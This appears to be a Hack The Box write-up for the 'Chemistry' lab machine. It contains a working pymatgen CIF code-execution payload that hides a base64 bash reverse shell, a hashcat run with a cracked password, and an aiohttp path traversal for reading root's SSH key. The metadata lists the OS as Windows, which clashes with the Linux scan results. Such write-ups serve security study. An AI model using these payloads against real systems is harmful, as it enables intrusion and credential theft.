```json
Alias: Chemistry
Date: 20-10_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.10.11.38
```

# Chemistry
# Summary

- Placeholder

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-20 18:41 PKT
Nmap scan report for 10.10.11.38
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
|_http-title: Chemistry - Home
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
8899/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.76 seconds
```


---
# Enumeration

There is a flask application running at port 5000, this allows us to upload `cif` files but the library used to parse them `pymatgen` is vulnerable to code execution due to improperly passing user input to eval.

---

# Exploitation

After trying a bunch of different things, this payload finally worked

```python
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("echo  c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTE0LzQ0NDQgMD4mMQ== | /bin/base64 -d | /bin/bash");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

and I got a reverse shell as `app` user

---

# Lateral Movement

## Local Enumeration

Looking around as `app` user we find the `database.db` located at `~/instance/database.db` and it is an `sqlite` database containing two tables, `structure` and `user`. The user table contains a bunch of hashes

![[Pasted image 20241020220531.png]]

Most of them are other `CTF` players but since the first 3 exist we can try cracking them.We get only the password of Rosa if  with `rockyou.txt`.

```sh
hashcat -m 0 63ed86ee9f624c7b14f1d4f43dc251a5 ~/Documents/Wordlists/rockyou.txt
```

| Username | Password          |
| -------- | ----------------- |
| rosa     | unicorniosrosados |

---

# Privilege Escalation

Looking at the running ports show that something is running on port `8080`, we can use chisel to route that to our local machine and look at it. It doesn't seem to be doing anything special, looking at the response in Burpsuite we see that the server is `aiohttp/3.9.1` this is vulnerable to a path traversal attack

curl the path

```
/assets/../../../root/.ssh/id_rsa
```

and we should get the root's `id_rsa`.

---

# Flags
- user.txt
- root.txt

#CTF #CTF/Hackthebox/Easy #Linux #LFI 